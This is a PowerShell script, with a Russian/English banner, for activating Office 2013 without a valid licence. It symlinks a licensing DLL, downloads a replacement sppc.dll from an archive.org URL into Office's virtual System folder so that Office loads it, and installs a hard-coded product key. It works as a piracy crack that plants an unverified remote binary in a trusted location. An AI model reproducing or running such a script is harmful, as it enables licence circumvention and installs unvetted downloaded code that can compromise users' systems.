Write-Output $(if ($PSUICulture -eq "ru-RU") {"Активация Office 2013 через подмену файла sppcs.dll"} else {"Activating Office 2013 via replacing sppcs.dll file"})

cmd /c mklink "$env:ProgramFiles\Microsoft Office 15\root\vfs\System\sppcs.dll" "$env:SystemRoot\System32\sppc.dll"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object net.webclient
$wc.DownloadFile('https://archive.org/download/asdcorpohook/sppc.dll', "$env:ProgramFiles\Microsoft Office 15\root\vfs\System\sppc.dll")
Set-Location "$env:ProgramFiles\Microsoft Office\Office15"
cscript //nologo ospp.vbs /inpkey:MBQBN-CQPT6-PXRMC-TYJFR-3C8MY
pause